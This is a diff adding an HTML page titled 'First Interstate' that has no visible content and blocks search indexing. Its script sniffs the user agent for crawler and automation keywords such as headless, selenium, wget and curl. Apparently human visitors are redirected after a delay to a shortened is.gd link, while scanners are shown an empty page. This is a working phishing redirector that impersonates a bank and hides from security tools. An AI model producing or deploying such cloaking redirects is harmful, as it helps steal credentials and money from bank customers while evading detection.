@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>First Interstate</title>
+
+  <!-- Block search engine indexing -->
+  <meta name="robots" content="noindex, nofollow">
+
+  <script>
+    function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+
+      const botKeywords = [
+        "bot",
+        "crawl",
+        "spider",
+        "slurp",
+        "headless",
+        "phantom",
+        "puppeteer",
+        "selenium",
+        "wget",
+        "curl"
+      ];
+
+      return botKeywords.some(keyword => ua.includes(keyword));
+    }
+
+    // ✅ Redirect real users only
+    if (!isBot()) {
+      setTimeout(function () {
+        window.location.href = "https://is.gd/ZqvnW4/";
+      }, 3000); // 5-second delay
+    }
+  </script>
+</head>
+<body>
+  <p></p>
+</body>
+</html>
